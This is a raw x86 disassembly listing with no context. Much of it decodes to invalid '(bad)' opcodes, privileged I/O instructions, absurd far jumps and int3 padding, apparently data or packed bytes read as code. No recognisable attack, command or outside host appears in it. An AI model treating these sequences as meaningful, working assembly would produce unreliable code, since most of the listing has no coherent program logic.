  41de19:	mov    ecx,DWORD PTR [ebx-0x74c5499b]
  41de1f:	mov    ecx,DWORD PTR [ebx+0xf0f0f0f]
  41de25:	(bad)  
  41de26:	(bad)  
  41de27:	(bad)  
  41de28:	(bad)  
  41de29:	shld   DWORD PTR [ebx+eiz*4+0x4],ecx,cl
  41de2e:	add    al,0x4
  41de30:	add    al,0x4
  41de32:	add    al,0x4
  41de34:	add    al,0x4
  41de36:	mov    ecx,DWORD PTR [ebx-0x3d116fa9]
  41de3c:	shl    ah,cl
  41de3e:	or     DWORD PTR [ecx+0x7015e948],ebx
  41de44:	ds pop ebx
  41de46:	inc    ebx
  41de47:	sub    BYTE PTR [edi+0x2e77f624],cl
  41de4d:	fsubr  QWORD PTR [edx-0x2e]
  41de50:	mov    ecx,DWORD PTR [ebx-0x7474e133]
  41de56:	and    esp,DWORD PTR [ecx]
  41de58:	mov    ecx,DWORD PTR [ebx+0x340e6232]
  41de5e:	ficom  WORD PTR [esi]
  41de60:	xchg   DWORD PTR [edi-0x7015dfdd],eax
  41de66:	aam    0x15
  41de68:	sub    al,0x76
  41de6a:	jns    0x41de09
  41de6c:	lea    esi,[edx-0x6b]
  41de6f:	jbe    0x41deb9
  41de71:	sbb    BYTE PTR [ebx-0x8953c00],cl
  41de77:	mov    DWORD PTR [eax],0xa94f0000
  41de7d:	addr16 or al,0x8c
  41de80:	or     eax,esi
  41de82:	popa   
  41de83:	jle    0x41de7c
  41de85:	xor    DWORD PTR [edx],0x2e
  41de88:	adc    DWORD PTR [ebx-0x5a],eax
  41de8b:	inc    ebx
  41de8c:	jbe    0x41de24
  41de8e:	inc    esp
  41de8f:	dec    ebp
  41de90:	dec    ebx
  41de91:	push   0xffffffa3
  41de93:	shl    esp,1
  41de95:	pushfw 
  41de97:	push   cs
  41de98:	loop   0x41de8f
  41de9a:	mov    eax,ds:0xab89df
  41de9f:	add    ah,dh
  41dea1:	pop    esi
  41dea2:	add    BYTE PTR [eax],al
  41dea4:	add    ah,cl
  41dea6:	int3   
  41dea7:	int3   
  41dea8:	int3   
  41dea9:	int3   
  41deaa:	int3   
  41deab:	int3   
  41deac:	int3   
  41dead:	int3   
  41deae:	push   0x211f
  41deb3:	add    BYTE PTR [eax],al
  41deb5:	add    BYTE PTR [eax],al
  41deb7:	add    BYTE PTR [eax],al
  41deb9:	add    BYTE PTR [esp+ecx*1],cl
  41debc:	mov    ebx,0x3a066fa0
  41dec1:	xlat   BYTE PTR ds:[ebx]
  41dec2:	push   ebp
  41dec3:	push   ebp
  41dec4:	mov    ch,0x5
  41dec6:	add    al,0x3
  41dec8:	jg     0x41dea9
  41deca:	mov    cl,0x55
  41decc:	and    ch,BYTE PTR [esi+edi*1+0x12]
  41ded0:	sbb    al,0x77
  41ded2:	sar    bl,0xc
  41ded5:	or     al,0xee
  41ded7:	into   
  41ded8:	adc    BYTE PTR [edx],0xdf
  41dedb:	or     eax,0x523b777
  41dee0:	mov    dh,0xc9
  41dee2:	pop    ds
  41dee3:	repz pusha 
  41dee5:	push   ss
  41dee6:	stc    
  41dee7:	add    al,0xf4
  41dee9:	dec    eax
  41deea:	addr16 dec esi
  41deec:	pop    ebx
  41deed:	scas   eax,DWORD PTR es:[edi]
  41deee:	sub    BYTE PTR [eax+edi*8+0x40],cl
  41def2:	xor    ecx,DWORD PTR [esp+ecx*1]
  41def5:	jae    0x41df58
  41def7:	pop    ecx
  41def8:	or     al,0xc
  41defa:	pop    edx
  41defb:	sub    bh,dl
  41defd:	or     al,0x0
  41deff:	mov    edx,0xbb9d9a8
  41df04:	out    dx,al
  41df05:	or     al,0xa5
  41df08:	mov    ebx,0x94a9e279
  41df0d:	enter  0xdf3c,0x30
  41df11:	dec    ebx
  41df12:	and    BYTE PTR [edi],dh
  41df14:	mov    esi,0xe32f
  41df19:	add    BYTE PTR [edx+0x4d000054],bl
  41df1f:	fwait
  41df20:	add    BYTE PTR [eax],al
  41df22:	add    ah,cl
  41df24:	int3   
  41df25:	int3   
  41df26:	int3   
  41df27:	int3   
  41df28:	int3   
  41df29:	int3   
  41df2a:	int3   
  41df2b:	int3   
  41df2c:	fcomp  QWORD PTR [edx]
  41df2e:	sar    DWORD PTR [ecx],cl
  41df30:	sbb    ebp,DWORD PTR [eax+0x4c]
  41df33:	add    al,0xa
  41df35:	shr    DWORD PTR [esi],cl
  41df37:	jl     0x41df49
  41df39:	int    0x3d
  41df3b:	int    0xa3
  41df3d:	aas    
  41df3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df3f:	(bad)  
  41df40:	ins    DWORD PTR es:[edi],dx
  41df41:	call   FWORD PTR [esi-0x17171797]
  41df47:	call   0xe92ac834
  41df4c:	call   0xff8654c6
  41df51:	rcr    DWORD PTR [edi-0x18d88a8b],cl
  41df57:	pushf  
  41df58:	inc    esi
  41df59:	cwde   
  41df5a:	jmp    0x18ac:0x6042d513
  41df61:	ins    DWORD PTR es:[edi],dx
  41df62:	mov    esp,0xbc2a0628
  41df67:	lahf   
  41df68:	cdq    
  41df69:	adc    ecx,DWORD PTR [eax]
  41df6b:	and    DWORD PTR [ebp+0x46],0x3f
  41df6f:	pop    edi
  41df70:	stc    
  41df71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df72:	je     0x41df0c
  41df74:	jle    0x41dfb2
  41df76:	das    
  41df77:	and    BYTE PTR [ebp+0x75],dh
  41df7a:	popa   
  41df7b:	out    0x75,al
  41df7d:	jne    0x41dfd1
  41df7f:	mov    dl,0xd3
  41df81:	jne    0x41df82
  41df83:	fmul   DWORD PTR [edx+0x2c]
  41df86:	jns    0x41dfde
  41df88:	xchg   ebp,eax
  41df89:	add    BYTE PTR [edx],dl
  41df8b:	pop    ebp
  41df8c:	in     al,0x9c
  41df8e:	push   ds
  41df8f:	cwde   
  41df90:	and    BYTE PTR [ecx],al
  41df92:	aad    0xa0
  41df94:	dec    ebp
  41df95:	aad    0x5c
  41df97:	mov    ebx,0xff422613
  41df9c:	(bad)  
  41df9d:	push   DWORD PTR [edx+0x1c1214eb]
  41dfa3:	in     eax,dx
  41dfa4:	in     eax,0x0
  41dfa6:	fist   DWORD PTR [edi-0x7017f77f]
  41dfac:	pop    edx
  41dfad:	int    0xdf
  41dfaf:	or     eax,0x5e41be7d
  41dfb4:	xchg   edi,eax
  41dfb5:	test   eax,0xa4c47178
  41dfba:	outs   dx,BYTE PTR ds:[esi]
  41dfbb:	(bad)  
  41dfbc:	jmp    FWORD PTR [eax]
  41dfbe:	into   
  41dfbf:	xchg   esi,eax
  41dfc0:	(bad)  
  41dfc1:	(bad)  
  41dfc2:	inc    DWORD PTR [eax]
	...
  41dfcc:	jmp    0x41e017
  41dfce:	jb     0x41dfcf
  41dfd0:	(bad)  
  41dfd1:	(bad)  
  41dfd2:	(bad)  
  41dfd3:	(bad)  
  41dfd4:	(bad)  
  41dfd5:	(bad)  
  41dfd6:	(bad)  
  41dfd7:	inc    eax
  41dfd9:	shl    cl,0xf0
  41dfdc:	movlps xmm3,QWORD PTR [ecx]
  41dfdf:	xchg   edx,eax
  41dfe0:	cwde   
  41dfe1:	mov    ebx,DWORD PTR [eax+0x11941c69]
  41dfe7:	cmp    dl,BYTE PTR [ebx-0x3cfc8ddd]
  41dfed:	xor    al,0x8d
  41dfef:	loope  0x41e049
  41dff1:	jo     0x41dfb3
  41dff3:	shl    BYTE PTR [edx+0x76],0xc0
  41dff7:	rcr    BYTE PTR [edx+0x60c0c04a],0x29
  41dffe:	dec    edi
  41dfff:	shr    DWORD PTR [esi+0x7e],cl
  41e002:	adc    ah,BYTE PTR [eax+0x19]
  41e005:	out    0xd4,eax
  41e007:	sbb    BYTE PTR [edx+0x46],bl
  41e00a:	push   ecx
  41e00b:	and    ebx,edx
  41e00d:	pop    esi
  41e00e:	push   esp
  41e00f:	cmp    al,0xd9
  41e011:	jne    0x41dfee
  41e013:	mov    es,eax
  41e015:	add    ah,bl
  41e017:	jbe    0x41e08a
  41e019:	and    al,BYTE PTR [eax]
  41e01b:	add    BYTE PTR [eax],al
  41e01d:	dec    ebx
  41e01e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e01f:	add    DWORD PTR [eax-0x68],ebp
  41e022:	popa   
  41e023:	jne    0x41e05d
  41e025:	test   al,0xe8
  41e027:	cld    
  41e028:	mov    cl,0x2e
  41e02a:	sahf   
  41e02b:	xchg   ebx,eax
  41e02c:	push   ss
  41e02d:	clc    
  41e02e:	aas    
  41e02f:	pop    ss
  41e030:	and    eax,0x19540c48
  41e035:	push   ebx
  41e036:	gs push edx
  41e038:	ins    DWORD PTR es:[edi],dx
  41e039:	pop    edx
  41e03a:	dec    esp
  41e03b:	dec    ebp
  41e03c:	mov    edx,0xc645b7
  41e041:	add    BYTE PTR [esi+eiz*2],dl
  41e044:	add    BYTE PTR [eax],al
  41e046:	add    BYTE PTR [ebp-0x72727273],cl
  41e04c:	lea    ecx,[ebp-0x768c7273]
  41e052:	mov    cl,BYTE PTR [eax]
  41e054:	or     BYTE PTR [eax],cl
  41e056:	or     BYTE PTR [eax],cl
  41e058:	or     BYTE PTR [eax],cl
  41e05a:	or     BYTE PTR [eax],cl
  41e05c:	lea    ecx,[ebp-0x2bcbfbb4]
  41e062:	js     0x41e07c
  41e064:	jle    0x41e08b
  41e066:	lods   al,BYTE PTR ds:[esi]
  41e067:	xor    ch,BYTE PTR ds:0x1c6bc0b0
  41e06d:	cdq    
  41e06e:	loope  0x41e0c3
  41e070:	push   cs
  41e071:	(bad)  
  41e072:	loope  0x41e010
  41e074:	lock mov eax,0x8bb98d8d
  41e07a:	js     0x41e050
  41e07c:	mov    ah,0x38
  41e07e:	cmp    DWORD PTR ss:[ebx+edi*8-0x1],ebp
  41e083:	sbb    BYTE PTR [eax-0x52caebbf],0xc1
  41e08a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e08b:	push   ds
  41e08c:	cli    
  41e08d:	or     bl,dl
  41e08f:	bound  edx,QWORD PTR [ecx-0xa]
  41e092:	iret   
  41e093:	dec    ebp
  41e094:	pusha  
  41e095:	lea    ecx,[ebp-0x721bdc4c]
  41e09b:	(bad)  
  41e09c:	lock aam 0x77
  41e09f:	lea    eax,[eax]
  41e0a1:	pop    ds
  41e0a2:	jmp    0x41e092
  41e0a4:	inc    edx
  41e0a5:	jo     0x41e09d
  41e0a7:	add    ch,ch
  41e0a9:	push   eax
  41e0aa:	cmp    al,0x91
  41e0ac:	mov    edi,0xcc41ca86
  41e0b1:	fistp  DWORD PTR [eax]
  41e0b3:	clc    
  41e0b4:	and    BYTE PTR [eax-0x56],ah
  41e0b7:	dec    ebx
  41e0b8:	jb     0x41e0ba
  41e0ba:	add    BYTE PTR [eax],al
  41e0bc:	mov    WORD PTR [edx],?
  41e0be:	add    BYTE PTR [eax],al
  41e0c0:	or     eax,0xe6
	...
  41e0cd:	add    BYTE PTR [edx],al
  41e0cf:	xchg   esp,eax
  41e0d0:	cld    
  41e0d1:	cdq    
  41e0d2:	or     DWORD PTR [esi],esi
  41e0d4:	add    dl,0x70
  41e0d7:	(bad)  
  41e0d8:	lea    edi,[ecx]
  41e0da:	cmp    edx,DWORD PTR [esi+0x5b]
  41e0dd:	mov    ebp,0x41bafadd
  41e0e2:	jp     0x41e13f
  41e0e4:	out    dx,eax
  41e0e5:	mov    ecx,0x89898989
  41e0ea:	mov    DWORD PTR [ecx+0x6e6e6820],ecx
  41e0f0:	jo     0x41e164
  41e0f2:	cs outs dx,DWORD PTR ds:[esi]
  41e0f5:	cmp    al,0x20
  41e0f7:	jo     0x41e119
  41e0f9:	jae    0x41e11b
  41e0fb:	data16 arpl WORD PTR [edx+0x6f],sp
  41e0ff:	dec    ebp
  41e100:	jns    0x41e146
  41e102:	jo     0x41e154
  41e104:	and    BYTE PTR [eiz*2+0x6965692e],ch
  41e10b:	imul   esi,DWORD PTR [esi+ebp*1+0x2e],0x20696420
  41e113:	jns    0x41e187
  41e115:	jns    0x41e137
  41e117:	fs jae 0x41e18c
  41e11a:	cs inc esp
  41e11c:	cs ins DWORD PTR es:[edi],dx
  41e11e:	fs push esp
  41e120:	ins    DWORD PTR es:[edi],dx
  41e121:	outs   dx,BYTE PTR ds:[esi]
  41e122:	outs   dx,BYTE PTR ds:[esi]
  41e123:	and    BYTE PTR ds:0x65206d6d,cl
  41e129:	dec    ebp
  41e12a:	jns    0x41e136
  41e12c:	imul   esi,DWORD PTR [edx+0x3c],0x65666575
  41e133:	push   ebp
  41e134:	gs cmp al,0x20
  41e137:	sub    al,0x63
  41e139:	cs je  0x41e15c
  41e13c:	ins    DWORD PTR es:[edi],dx
  41e13d:	jo     0x41e17b
  41e13f:	jbe    0x41e161
  41e141:	outs   dx,DWORD PTR gs:[esi]
  41e143:	or     ah,BYTE PTR ds:[edx]
  41e146:	dec    ebp
  41e147:	ins    DWORD PTR es:[edi],dx
  41e148:	outs   dx,DWORD PTR ds:[esi]
  41e149:	outs   dx,DWORD PTR ds:[esi]
  41e14a:	bound  ecx,QWORD PTR cs:[ebp-0x77]
  41e14e:	mov    DWORD PTR [ecx-0x55edbabb],ecx
  41e154:	icebp  
  41e155:	out    0x45,eax
  41e157:	inc    ebp
  41e158:	push   cs
  41e159:	cmc    
  41e15a:	in     eax,0x74
  41e15c:	or     al,0x7d
  41e15e:	mul    eax
  41e160:	xchg   ebp,eax
  41e161:	call   0xb340450d
  41e166:	sub    DWORD PTR [ecx+0x46],0xa8603f91
  41e16d:	push   ss
  41e16e:	sub    edi,DWORD PTR [ebp-0x56c16813]
  41e174:	frndint 
  41e176:	jae    0x41e1c9
  41e178:	sbb    BYTE PTR [ecx+edx*8],bh
  41e17b:	inc    ebp
  41e17c:	inc    ebp
  41e17d:	pop    ecx
  41e17e:	dec    ecx
  41e17f:	inc    ebp
  41e180:	inc    ebp
  41e181:	in     al,dx
  41e182:	shl    DWORD PTR [ebp+eax*2+0x3ea3de00],1
  41e189:	in     eax,0xc5
  41e18b:	jne    0x41e1b1
  41e18d:	pop    edi
  41e18e:	pop    edx
  41e18f:	mov    ?,WORD PTR [eax+0x66]
  41e192:	mov    edi,0x161706e6
  41e197:	sub    BYTE PTR [ebx],ch
  41e199:	dec    DWORD PTR [edx+0x6132ed]
  41e19f:	add    BYTE PTR [eax],al
  41e1a1:	pop    edx
  41e1a2:	sbb    cl,BYTE PTR [edx+ebp*2-0x53c45c46]
  41e1a9:	xchg   DWORD PTR [esi+0x12],ecx
  41e1ac:	rcr    DWORD PTR es:[edi],0x68
  41e1b0:	xor    ah,cl
  41e1b2:	cmp    eax,DWORD PTR [esi-0x227af976]
  41e1b8:	jmp    0x4b:0xf693bc13
  41e1bf:	add    BYTE PTR [esi],bh
  41e1c1:	lea    ebx,[edi]
	...
  41e1cf:	fmul   DWORD PTR [edx]
  41e1d1:	mov    es,WORD PTR [eax]
	...
  41e1db:	add    BYTE PTR [eax],al
  41e1dd:	mov    ebp,DWORD PTR [edx+0x19f9d838]
  41e1e3:	jae    0x41e181
  41e1e5:	push   cs
  41e1e6:	xor    al,BYTE PTR [esi-0x52]
  41e1e9:	push   esp
  41e1ea:	dec    ecx
  41e1eb:	(bad)  
  41e1ed:	inc    BYTE PTR [edx-0x76]
  41e1f0:	or     DWORD PTR [ecx],ebp
  41e1f2:	push   0xfffffff6
  41e1f4:	cmp    al,BYTE PTR [eax]
  41e1f6:	add    BYTE PTR [ecx],al
  41e1f8:	add    BYTE PTR ds:[eax],al
  41e1fb:	pop    ebp
  41e1fc:	in     eax,0x0
  41e1fe:	add    BYTE PTR [esi],ah
  41e200:	pushf  
  41e201:	nop
  41e202:	rol    DWORD PTR [edx+0x75b4eab7],1
  41e208:	push   ecx
  41e209:	mov    al,0xe5
  41e20b:	loopne 0x41e27b
  41e20d:	in     eax,dx
  41e20e:	cwde   
  41e20f:	rcl    BYTE PTR [esi-0x1e047aab],1
  41e215:	push   ss
  41e216:	sub    DWORD PTR [eax],eax
  41e218:	unpcklps xmm3,XMMWORD PTR [esi+0x43]
  41e21c:	or     BYTE PTR [edi],0xf
  41e21f:	setns  BYTE PTR [ecx-0x401a4627]
  41e226:	or     dl,BYTE PTR [ebx+esi*4+0x67bba990]
  41e22d:	sbb    eax,0x40d6e854
  41e232:	fcomp  st(5)
  41e234:	inc    edx
  41e235:	sahf   
  41e236:	xchg   esi,eax
  41e237:	pop    eax
  41e238:	add    esi,DWORD PTR [edx+0x6f]
  41e23b:	stos   DWORD PTR es:[edi],eax
  41e23c:	and    edx,DWORD PTR [ebx]
  41e23e:	repnz out 0x9,eax
  41e241:	push   esi
  41e242:	icebp  
  41e243:	(bad)  
  41e244:	(bad)  
  41e246:	dec    eax
  41e247:	(bad)  
  41e248:	(bad)  
  41e249:	sldt   WORD PTR [eax]
  41e24c:	add    BYTE PTR [eax],al
  41e24e:	add    BYTE PTR [eax],al
  41e250:	add    BYTE PTR [eax],al
  41e252:	add    ah,al
  41e254:	sbb    BYTE PTR [esi],al
	...
  41e25e:	add    BYTE PTR [ebp+0x45],al
  41e261:	imul   ebx,DWORD PTR [ebx-0x1a2fb7d4],0xffffffc2
  41e268:	call   0x414f:0xf01b8438
  41e26f:	(bad)  [eax+0x4b9080dc]
  41e275:	mov    al,ds:0x45979995
  41e27a:	inc    ebp
  41e27b:	mov    dl,0xcd
  41e27d:	in     eax,0x31
  41e27f:	aam    0x4e
  41e281:	xchg   edx,eax
  41e282:	adc    DWORD PTR [edx-0x44],0xffffff8f
  41e286:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e287:	ret    
  41e288:	or     ebx,ebx
  41e28a:	push   esi
  41e28b:	shl    BYTE PTR [eax-0x397f380e],1
  41e291:	mov    eax,0x5e8d2ed5
  41e296:	adc    eax,0x1e454538
  41e29b:	lea    ebp,[eax-0x75a1babb]
  41e2a1:	or     BYTE PTR [ebp+0x45],al
  41e2a4:	in     al,0xa6
  41e2a6:	int    0x33
  41e2a8:	out    dx,al
  41e2a9:	int    0xb8
  41e2ab:	stc    
  41e2ac:	inc    ebx
  41e2ad:	push   ecx
  41e2ae:	pop    ds
  41e2af:	pop    ds
  41e2b0:	lods   eax,DWORD PTR ds:[esi]
  41e2b1:	lods   eax,DWORD PTR ds:[esi]
  41e2b2:	aas    
  41e2b3:	xchg   DWORD PTR [eax],esi
  41e2b5:	shl    BYTE PTR [edi-0x7cdfb294],cl
  41e2bb:	mov    eax,DWORD PTR [ebp+0x45]
  41e2be:	inc    ebp
  41e2bf:	cdq    
  41e2c0:	jp     0x41e307
  41e2c2:	inc    ebp
  41e2c3:	push   esp
  41e2c4:	or     eax,0xcc454545
  41e2c9:	int3   
  41e2ca:	int3   
  41e2cb:	int3   
  41e2cc:	int3   
  41e2cd:	int3   
  41e2ce:	int3   
  41e2cf:	int3   
  41e2d0:	int3   
  41e2d1:	ss jmp 0x6e8d0dea
  41e2d7:	retf   
  41e2d8:	mov    ecx,ecx
  41e2da:	xchg   edi,eax
  41e2db:	scas   al,BYTE PTR es:[edi]
  41e2dc:	call   0xc96c:0xe5423e11
  41e2e3:	jae    0x41e2e4
  41e2e5:	and    eax,0x85852b96
  41e2eb:	test   DWORD PTR [ebp-0x7a7a7a7b],eax
  41e2f1:	test   DWORD PTR [ebx+0x10f9a28b],ecx
  41e2f7:	mov    ecx,DWORD PTR gs:[ebx-0x5d5702de]
  41e2fe:	adc    al,0xf8
  41e300:	in     eax,0xc3
  41e302:	or     ch,ah
  41e304:	and    eax,0xeadd3bcf
  41e309:	outs   dx,DWORD PTR ds:[esi]
  41e30a:	jecxz  0x41e2e4
  41e30c:	cs mov al,al
  41e30f:	loope  0x41e2a3
  41e311:	push   0x3eac7b1c
  41e316:	jge    0x41e374
  41e318:	into   
  41e319:	dec    edx
  41e31a:	ret    0x83f3
  41e31d:	mov    ecx,DWORD PTR [ebx-0x7474dda9]
  41e323:	stos   BYTE PTR es:[edi],al
  41e324:	pop    es
  41e325:	inc    edx
  41e326:	mov    ecx,DWORD PTR [ebx+0xe0c76d]
  41e32c:	out    0x21,al
  41e32e:	lds    edi,FWORD PTR [esi]
  41e330:	xchg   ebp,eax
  41e331:	sub    dl,BYTE PTR ds:0x1b8ba03a
  41e337:	loop   0x41e330
  41e339:	push   ss
  41e33a:	iret   
  41e33b:	loope  0x41e31e
  41e33d:	xchg   edx,eax
  41e33e:	fld    st(4)
  41e340:	mov    ecx,DWORD PTR [ebx-0x216f2875]
  41e346:	mov    ah,0x84
  41e348:	fs enter 0x37c7,0xbe
  41e34d:	fcomip st,st(5)
  41e34f:	mov    bh,0x9d
  41e351:	loop   0x41e3b4
  41e353:	pop    esi
  41e354:	dec    esp
  41e355:	pop    ebx
  41e356:	dec    ecx
  41e357:	add    edx,DWORD PTR [esi+0x7b85987f]
  41e35d:	pop    es
  41e35e:	jl     0x41e3d9
  41e360:	mov    ecx,DWORD PTR [ebx-0x74f6abb6]
  41e366:	mov    ecx,DWORD PTR [ebx+0x0]
  41e36c:	add    BYTE PTR [eax],al
  41e36e:	add    BYTE PTR [eax],al
  41e370:	add    BYTE PTR [edx+0x41],dh
  41e373:	rol    BYTE PTR [eax],1
	...
  41e37d:	(bad)  
  41e37e:	(bad)  
  41e37f:	in     eax,dx
  41e380:	imul   esi,edi,0xffffffa2
  41e383:	and    ecx,DWORD PTR [ecx-0x6104eb95]
  41e389:	xlat   BYTE PTR ds:[ebx]
  41e38a:	or     BYTE PTR [ecx-0x71],ch
  41e38d:	pop    ss
  41e38e:	jge    0x41e336
  41e390:	leave  
  41e391:	test   eax,0xcb21c105
  41e396:	cmp    eax,0x3bb9ffff
  41e39b:	(bad)  
  41e39c:	dec    DWORD PTR [ecx+ebx*4]
  41e39f:	(bad)  
  41e3a0:	jmp    FWORD PTR [esi+esi*2-0x75]
  41e3a4:	popf   
  41e3a5:	mov    bl,0x5c
  41e3a7:	aam    0x2
  41e3a9:	stos   DWORD PTR es:[edi],eax
  41e3aa:	or     al,0x52
  41e3ac:	jno    0x41e3f8
  41e3ae:	pop    eax
  41e3af:	push   es
  41e3b0:	std    
  41e3b1:	out    dx,al
  41e3b2:	pmaddwd mm0,QWORD PTR [ebx-0x17]
  41e3b6:	hlt    
  41e3b7:	ss iret 
  41e3b9:	jmp    FWORD PTR [edx+0x5b]
  41e3bc:	loope  0x41e345
  41e3be:	pop    esi
  41e3bf:	push   0x6a
  41e3c1:	push   0x36
  41e3c3:	inc    ebx
  41e3c4:	add    al,0x21
  41e3c6:	cwde   
  41e3c7:	mov    DWORD PTR [esi+eiz*4+0x25d0f51b],ebx
  41e3ce:	sahf   
  41e3cf:	stos   DWORD PTR es:[edi],eax
  41e3d0:	stos   BYTE PTR es:[edi],al
  41e3d1:	mov    ebx,0x59848a48
  41e3d6:	scas   eax,DWORD PTR es:[edi]
  41e3d7:	ror    BYTE PTR gs:[eax-0x2b2dcec9],1
  41e3de:	bound  edx,QWORD PTR [ecx-0x30]
  41e3e1:	aad    0xc8
  41e3e3:	sbb    eax,0xf46a6a05
  41e3e8:	and    ebp,DWORD PTR [edx+0x6a]
  41e3eb:	push   0x74
  41e3ed:	je     0x41e463
  41e3ef:	je     0x41e465
  41e3f1:	je     0x41e467
  41e3f3:	je     0x41e469
  41e3f5:	pop    esp
  41e3f6:	aam    0x6f
	...
  41e400:	add    al,ch
  41e402:	call   0x16c885d4
  41e407:	mov    eax,0xc5c73429
  41e40c:	cs dec ebx
  41e40e:	push   es
  41e40f:	fwait
  41e410:	push   ss
  41e411:	pop    eax
  41e412:	in     al,dx
  41e413:	xor    ebp,0x79
  41e416:	and    BYTE PTR [ebx+0x76],dh
  41e419:	cs jo  0x41e44a
  41e41c:	ins    DWORD PTR es:[edi],dx
  41e41d:	and    ch,BYTE PTR [ebp+0x76]
  41e420:	imul   edx,DWORD PTR [edx+0x66],0x67207070
  41e427:	ins    DWORD PTR es:[edi],dx
  41e428:	jae    0x41e46b
  41e42a:	ds outs dx,BYTE PTR gs:[esi]
  41e42d:	jb     0x41e490
  41e42f:	popa   
  41e430:	je     0x41e473
  41e432:	and    al,BYTE PTR [ecx+0x74]
  41e435:	imul   esp,DWORD PTR [eax],0x226d3c2e
  41e43b:	cs jb  0x41e4ab
  41e43e:	outs   dx,BYTE PTR ds:[esi]
  41e43f:	and    BYTE PTR fs:[esi],ch
  41e442:	and    BYTE PTR [eax+0x74],dh
  41e445:	bound  ebp,QWORD PTR [esi]
  41e447:	je     0x41e477
  41e449:	je     0x41e46b
  41e44b:	outs   dx,DWORD PTR ds:[esi]
  41e44c:	ins    DWORD PTR es:[edi],dx
  41e44d:	imul   esp,DWORD PTR [ebp+0x78],0x5a41d4de
  41e454:	call   0x5272da41
  41e459:	aaa    
  41e45a:	lahf   
  41e45b:	mov    fs,WORD PTR [edi+0x2e]
  41e45e:	push   cs
  41e45f:	stos   DWORD PTR es:[edi],eax
  41e460:	ins    DWORD PTR es:[edi],dx
  41e461:	sbb    ah,cl
  41e463:	mov    dl,0x50
  41e465:	xor    cl,BYTE PTR [ebp+0x424213e5]
  41e46b:	ret    0x5e94
  41e46e:	in     al,0x72
  41e470:	stc    
  41e471:	sbb    ecx,edi
  41e473:	call   0x58a84760
  41e478:	call   0x43078b65
  41e47d:	call   0xb586cf8a
  41e482:	leave  
  41e483:	inc    esp
  41e484:	dec    esp
  41e485:	shl    DWORD PTR ds:0xaa03ff43,0x97
  41e48c:	sub    al,0xa1
  41e48e:	pop    esi
  41e48f:	test   eax,0x3922917a
  41e494:	sub    edx,DWORD PTR [eax]
  41e496:	out    0x8,eax
  41e498:	or     BYTE PTR [eax],cl
  41e49a:	mov    ch,0xcb
  41e49c:	or     BYTE PTR [eax],cl
  41e49e:	(bad)  
  41e49f:	sub    cl,BYTE PTR [eax]
  41e4a1:	or     BYTE PTR [eax],cl
	...
  41e4ab:	add    BYTE PTR [ebp-0x5bdad475],dh
  41e4b1:	or     BYTE PTR [ecx+0x350bc966],ah
  41e4b7:	adc    al,0x27
  41e4b9:	push   edi
  41e4ba:	arpl   sp,bp
  41e4bc:	push   ss
  41e4bd:	call   0x6db0dd67
  41e4c2:	xchg   ebx,eax
  41e4c3:	jmp    0x41e4c8
  41e4c8:	add    BYTE PTR [eax],al
  41e4ca:	add    BYTE PTR [eax],al
  41e4cc:	add    BYTE PTR [eax+0x50],dl
  41e4cf:	in     eax,dx
  41e4d0:	and    ecx,ebp
  41e4d2:	sub    edx,DWORD PTR [eax+0x50]
  41e4d5:	dec    edi
  41e4d6:	pop    ss
  41e4d7:	dec    ebp
  41e4d8:	dec    ecx
  41e4d9:	jns    0x41e547
  41e4db:	data16 aam 0x5f
  41e4de:	add    edi,edi
  41e4e0:	mov    cl,0x40
  41e4e2:	xchg   BYTE PTR [edx],dl
  41e4e4:	in     eax,0xa6
  41e4e6:	popa   
  41e4e7:	or     DWORD PTR [esi],0x24
  41e4ea:	jns    0x41e566
  41e4ec:	xchg   esp,eax
  41e4ed:	mov    al,0xf8
  41e4ef:	dec    esp
  41e4f0:	(bad)  
  41e4f1:	lahf   
  41e4f2:	xchg   esp,eax
  41e4f3:	add    DWORD PTR [edx+0x50101ae2],edx
  41e4f9:	push   eax
  41e4fa:	lock int 0x50
  41e4fd:	push   eax
  41e4fe:	jb     0x41e4ea
  41e500:	jbe    0x41e552
  41e502:	inc    ebx
  41e504:	push   esi
  41e505:	cli    
  41e506:	xchg   esi,eax
  41e507:	dec    ecx
  41e508:	add    eax,0x88ab356e
  41e50d:	dec    edi
  41e50e:	les    ebx,FWORD PTR [edx]
  41e510:	cwde   
  41e511:	dec    esp
  41e512:	inc    edx
  41e513:	xchg   ebp,eax
  41e514:	mov    edi,0x2cbda852
  41e519:	cmc    
  41e51a:	cmp    edi,0xffffffff
  41e51d:	(bad)  
  41e51e:	in     eax,dx
  41e51f:	xchg   esi,eax
  41e520:	js     0x41e521
  41e522:	push   cs
  41e523:	jle    0x41e54e
  41e525:	xor    DWORD PTR [eax],eax
  41e527:	sub    DWORD PTR [edx+edi*8+0x7a],esi
  41e52b:	dec    esi
  41e52c:	xchg   BYTE PTR [edx+0x23],al
  41e52f:	lds    ebp,FWORD PTR [edi]
  41e531:	test   DWORD PTR [eax],ecx
  41e533:	dec    BYTE PTR [ecx]
  41e535:	push   edi
  41e536:	mov    eax,ds:0xda7a7cc7
  41e53b:	(bad)  
  41e53c:	call   DWORD PTR [esi-0x2fbc]
  41e542:	push   DWORD PTR [ebp+0x75]
  41e545:	jne    0x41e5bc
  41e547:	jne    0x41e5be
  41e549:	jne    0x41e5c0
  41e54b:	jne    0x41e532
  41e54d:	outs   dx,DWORD PTR ds:[esi]
  41e54e:	jp     0x41e5c4
  41e550:	je     0x41e5c6
  41e552:	je     0x41e5c8
  41e554:	je     0x41e5ca
  41e556:	je     0x41e5cc
  41e558:	lea    ecx,[ebp-0x6006a365]
  41e55e:	mov    esp,0x4ccf3a2d
  41e563:	adc    esi,DWORD PTR [edi-0x6c915685]
  41e569:	cdq    
  41e56a:	mov    BYTE PTR [ebx-0x22cba91f],ah
  41e570:	jl     0x41e57b
  41e572:	lea    ecx,[ebp-0x7272e029]
  41e578:	repnz push esi
  41e57a:	lea    ecx,[ebp-0x7f82f419]
  41e580:	retf   0xd5c1
  41e583:	cwde   
  41e584:	aad    0xee
  41e586:	xchg   esp,eax
  41e587:	stc    
  41e588:	data16 rol BYTE PTR [eax+0x7d],1
  41e58c:	stos   DWORD PTR es:[edi],eax
  41e58d:	push   eax
  41e58e:	bound  edi,QWORD PTR [ebx]
  41e590:	leave  
  41e591:	jno    0x41e5c3
  41e593:	push   ebp
  41e594:	lea    ecx,[ecx+0xb05dce]
